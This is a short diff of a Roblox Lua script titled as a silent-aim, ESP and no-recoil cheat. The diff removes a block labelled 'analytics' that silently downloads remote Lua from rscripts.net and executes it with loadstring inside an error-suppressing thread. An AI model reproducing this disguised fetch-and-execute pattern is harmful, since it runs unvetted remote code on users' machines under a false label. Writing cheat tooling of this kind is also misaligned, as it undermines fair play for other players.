@@ -7,16 +7,6 @@
 --   • Treat fake Roblox login / "claim reward" pages as phishing.
 -- [[ End Rscripts Risk Notice ]]
 
---[[rscripts:analytics:start]]
--- Script analytics (enabled by the creator on rscripts.net).
--- Runs in its own thread and cannot affect the script below.
-task.spawn(function()
-	pcall(function()
-		loadstring(game:HttpGet("https://rscripts.net/api/telemetry/v2/client.lua?s=6adf4d77f733a6e82c132552"))()
-	end)
-end)
---[[rscripts:analytics:end]]
-
 -- =========================================================
 -- SILENT AIM + ESP + NO RECOIL
 -- GUI carrée, sans Drawing
